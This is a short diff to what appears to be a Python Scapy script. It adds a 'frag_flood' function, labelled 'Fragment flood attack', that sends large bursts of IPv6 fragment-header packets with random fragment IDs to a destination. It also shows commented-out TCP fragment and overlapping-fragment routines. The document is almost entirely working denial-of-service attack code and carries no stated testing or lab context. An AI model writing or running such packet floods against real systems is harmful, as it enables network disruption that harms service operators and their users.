@@ -29,8 +29,19 @@ def tcp_fragment():
     send(packet_2)
 
 
-for i in range(number_packets):
-    tcp_fragment()
+# for i in range(number_packets):
+#     tcp_fragment()
+
+
+def frag_flood():
+    print ("Fragment flood attack")
+    flood_num_packets = 500
+    packets = IPv6(dst=RandIP6(destination))/IPv6ExtHdrFragment(id=[RandNum(1,2**32)] * flood_num_packets)
+    packets.show()
+    send(packets, count=int(number_packets))
+
+    
+frag_flood()
 
 
 # def frag_overlap():
@@ -52,7 +63,7 @@ for i in range(number_packets):
 #     send(second)
 #     for a in range(num_tail_packets):
 #         send(tail)
-# 
-# 
+#
+#
 # for i in range(number_packets):
 #     frag_overlap()
